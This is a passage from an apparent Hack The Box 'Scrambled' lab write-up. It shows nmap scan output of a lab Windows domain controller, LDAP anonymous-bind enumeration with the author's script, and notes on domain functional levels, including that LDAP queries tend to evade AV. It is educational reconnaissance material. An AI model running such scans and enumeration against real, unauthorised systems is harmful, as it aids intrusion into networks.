%5cr%5cn%22%29%25r%28%0aSF:TLSSessionReq,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28Kerberos,1D,%22SC%0aSF:RAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28SMBProgNeg,1D,%22SCRAMBLECORP_ORDERS_%0aSF:V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28X11Probe,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28Fo%0aSF:urOhFourRequest,35,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cnERROR_UNKNOWN_COMM%0aSF:AND;%5cr%5cn%22%29%25r%28LPDString,35,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cnERROR_UNKNO%0aSF:WN_COMMAND;%5cr%5cn%22%29%25r%28LDAPSearchReq,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%0aSF:%22%29%25r%28LDAPBindReq,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28SIPOptions,3%0aSF:5,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cnERROR_UNKNOWN_COMMAND;%5cr%5cn%22%29%25r%28LAND%0aSF:esk-RC,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28TerminalServer,1D,%22SCR%0aSF:AMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28NCP,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3%0aSF:;%5cr%5cn%22%29%25r%28NotesRPC,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28JavaRMI,1D%0aSF:,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28WMSRequest,1D,%22SCRAMBLECORP_ORD%0aSF:ERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28oracle-tns,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%0aSF:%29%25r%28ms-sql-s,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28afp,1D,%22SCRAMBLE%0aSF:CORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28giop,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5c%0aSF:n%22%29;%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2889%25%29%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2889%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20Host:%20DC1;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202024-10-06T13:43:41%0a%7c_%20%20start_date:%20N/A%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20324.38%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46.02-HTB/BlogEntriesMade/Scrambled/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 11s
+</span></span><span style="display:flex;"><span>🕙 14:38:27 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-06 14:38 BST
+</span></span><span style="display:flex;"><span>Stats: 0:01:18 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing SYN Stealth Scan
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 48.86% <span style="color:#66d9ef">done</span>; ETC: 14:41 <span style="color:#f92672">(</span>0:01:14 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.115.202
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65513</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Bug in ms-sql-ntlm-info: no string output.
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Scramble Corp Intranet
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-10-06 13:41:06Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T01:42:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2023-06-09T01:42:36
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T01:42:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2023-06-09T01:42:36
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>| ms-sql-info:
+</span></span><span style="display:flex;"><span>|   10.129.115.202:1433:
+</span></span><span style="display:flex;"><span>|     Version:
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-10-06T07:30:55
+</span></span><span style="display:flex;"><span>|_Not valid after:  2054-10-06T07:30:55
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T01:42:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2023-06-09T01:42:36
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T01:42:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2023-06-09T01:42:36
+</span></span><span style="display:flex;"><span>4411/tcp  open  found?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
+</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
+</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style="display:flex;"><span>|_    ERROR_UNKNOWN_COMMAND;
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49674/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49698/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>52608/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>57490/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port4411-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/6%Time<span style="color:#f92672">=</span>67029371%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>NULL,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,1D,<span style="color:#e6db74">&#34;SCRAMB
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:LECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_OR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:DERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,35,<span style="color:#e6db74">&#34;SCRAMB
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:LECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,1D,<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:CORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:RS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:KNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>SF:TLSSessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,1D,<span style="color:#e6db74">&#34;SC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Fo
+</span></span><span style="display:flex;"><span>SF:urOhFourRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMM
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:AND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:WN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPBindReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,3
+</span></span><span style="display:flex;"><span>SF:5,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LAND
+</span></span><span style="display:flex;"><span>SF:esk-RC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,1D,<span style="color:#e6db74">&#34;SCR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NotesRPC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>JavaRMI,1D
+</span></span><span style="display:flex;"><span>SF:,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>WMSRequest,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>oracle-tns,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ms-sql-s,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>afp,1D,<span style="color:#e6db74">&#34;SCRAMBLE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:CORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>giop,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2024-10-06T13:43:41
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 324.38 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Interesting find here: Port <code>4411</code>, looks to be a custom service running.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
+<ul>
+<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
+</ul>
+</li>
+<li>
+<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.12.6%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2008:19:00%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.174.234%20with%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=scrm,DC=local%0a%20%20%20%20CN=Configuration,DC=scrm,DC=local%0a%20%20%20%20CN=Schema,CN=Configuration,DC=scrm,DC=local%0a%20%20%20%20DC=DomainDnsZones,DC=scrm,DC=local%0a%20%20%20%20DC=ForestDnsZones,DC=scrm,DC=local">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools 🐍 v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 08:19:00 zsh ❯ python3 ldapchecker.py $box
+</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.174.234 with SSL...
+</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
+</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  Naming contexts:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>scrm,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>scrm,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>scrm,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>scrm,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>scrm,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
+</span></span><span style="display:flex;"><span>  domainFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  forestFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Functional Level Number</th>
+          <th style="text-align: left">Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">0</td>
+          <td style="text-align: left">Windows 2000</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">1</td>
+          <td style="text-align: left">Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">2</td>
+          <td style="text-align: left">Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">3</td>
+          <td style="text-align: left">Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">4</td>
+          <td style="text-align: left">Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">5</td>
+          <td style="text-align: left">Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">6</td>
+          <td style="text-align: left">Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">7</td>
+          <td style="text-align: left">Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">8</td>
+          <td style="text-align: left">Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">9</td>
+          <td style="text-align: left">Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>+Note+:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
